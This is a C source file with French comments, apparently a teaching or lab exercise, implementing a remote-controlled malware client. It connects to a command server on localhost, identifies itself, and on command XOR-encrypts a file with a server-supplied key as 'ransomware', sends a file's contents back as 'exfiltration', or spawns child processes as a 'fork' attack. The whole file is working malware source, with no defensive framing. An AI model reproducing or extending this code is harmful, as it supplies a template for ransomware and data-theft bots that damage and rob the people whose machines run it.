#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>

#define SERVER_IP "127.0.0.1"
#define PORT 12345
#define BUFFER_SIZE 1024

void encrypt_file(const char *filename, const char *key) {
    FILE *file = fopen(filename, "r+");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        return;
    }

    char buffer[BUFFER_SIZE] = {0};
    fread(buffer, 1, sizeof(buffer) - 1, file);

    // Chiffrement basique (XOR avec la clé)
    size_t key_len = strlen(key);
    for (size_t i = 0; i < strlen(buffer); i++) {
        buffer[i] ^= key[i % key_len];
    }

    rewind(file);
    fwrite(buffer, 1, strlen(buffer), file);
    fclose(file);

    printf("Fichier '%s' chiffré avec succès.\n", filename);
}

void exfiltrate_file(int server_fd, const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        return;
    }

    char buffer[BUFFER_SIZE] = {0};
    fread(buffer, 1, sizeof(buffer) - 1, file);
    fclose(file);

    send(server_fd, buffer, strlen(buffer) + 1, 0);
    printf("Fichier '%s' exfiltré avec succès.\n", filename);
}

void infinite_fork() {
    for (int i = 0; i < 10; i++) {
        if (fork() == 0) {
            printf("Processus enfant créé avec PID : %d\n", getpid());
            exit(0);
        }
    }
    while (wait(NULL) > 0);
    printf("Fork terminé.\n");
}

int main() {
    int client_socket;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE] = {0};

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) {
        perror("Erreur de création du socket");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erreur de connexion au serveur");
        exit(EXIT_FAILURE);
    }

    char client_id[] = "Diouma";
    send(client_socket, client_id, strlen(client_id) + 1, 0);

    while (1) {
        recv(client_socket, buffer, BUFFER_SIZE, 0);
        printf("Ordre reçu : %s\n", buffer);

        if (strcmp(buffer, "ransomware") == 0) {
            char key[BUFFER_SIZE] = {0};
            recv(client_socket, key, BUFFER_SIZE, 0);
            encrypt_file("testfile.txt", key);

            int files_encrypted = 1; // Par exemple, un fichier chiffré
            snprintf(buffer, BUFFER_SIZE, "%d", files_encrypted);
            send(client_socket, buffer, strlen(buffer) + 1, 0);

        } else if (strcmp(buffer, "exfiltration") == 0) {
            exfiltrate_file(client_socket, "testfile.txt");

        } else if (strcmp(buffer, "fork") == 0) {
            infinite_fork();

        } else if (strcmp(buffer, "out") == 0) {
            printf("Déconnexion demandée par le serveur. Fermeture du client.\n");
            close(client_socket);
            exit(0);

        } else {
            printf("Ordre inconnu reçu. Ignoré.\n");
        }
    }

    close(client_socket);
    return 0;
}
